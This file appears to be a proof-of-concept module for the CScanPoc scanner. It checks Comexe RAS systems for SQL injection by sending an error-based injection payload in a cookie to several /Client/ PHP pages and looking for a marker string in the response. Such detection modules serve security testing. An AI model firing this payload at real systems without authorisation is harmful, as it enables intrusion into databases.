# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Comexe_0001'  # 平台漏洞编号，留空
    name = '科迈RAS系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        科迈RAS 为企业提供了一种从中心点集中管理应用程序远程接入方法。
        科迈RAS系统，函数过滤不全导致SQL注射。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '科迈RAS系统'  # 漏洞应用名称
    product_version = '科迈RAS系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a7bc8bbd-bd0d-406d-a9c0-66ee8bfb165c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payloads = [
                "/Client/CmxHome.php cookie",
                "/Client/CmxAbout.php",
                "/Client/CmxChangePass.php",
                "/Client/CmxDownload.php"
            ]
            for payload in payloads:
                target = self.target + payload
                header = {
                    "Cookie": "RAS_UserInfo_UserName=-4758' OR 1 GROUP BY CONCAT(0x71786a6271,(SELECT (CASE WHEN (5786=5786) THEN 1 ELSE 0 END)),0x71707a7171,FLOOR(RAND(0)*2)) HAVING MIN(0)#"
                }
                response = requests.get(target, headers=header)
                if response.status_code == 200 and 'qxjbq1qpzqq1' in response.text:
                    # security_hole(target)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
